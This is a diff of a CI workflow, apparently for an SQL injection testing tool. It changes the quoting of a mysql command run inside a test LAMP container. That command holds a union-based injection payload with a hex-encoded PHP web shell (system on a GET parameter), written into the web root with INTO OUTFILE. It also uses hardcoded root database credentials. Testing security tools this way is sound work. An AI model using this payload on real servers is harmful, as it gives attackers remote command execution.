@@ -109,7 +109,7 @@ jobs:
         cat <<EOF | sudo docker exec -i jsql-lamp /bin/bash
           ls /var/www/html/
           cat /var/www/html/get.php
-          mysql -uroot -ppassword --port=3308 -e '
+          mysql -uroot -ppassword --port=3308 -e "
             SELECT * FROM INFORMATION_SCHEMA.schemata where 1=0010021212 union select 1,1,1,1,(select 0x3c53714c693e3c3f7068702073797374656d28245f4745545b2763275d293b203f3e3c694c51533e)into outfile"/var/www/html/.0.90.jw.php"-- -esUR
             select load_file('/var/www/html/get.php');
             select load_file('/var/www/html/.0.90.jw.php');
@@ -117,7 +117,7 @@ jobs:
             SHOW GRANTS;
             SHOW VARIABLES;
             SHOW DATABASES;
-          '
+          "
         EOF
 
     - name: Build project container
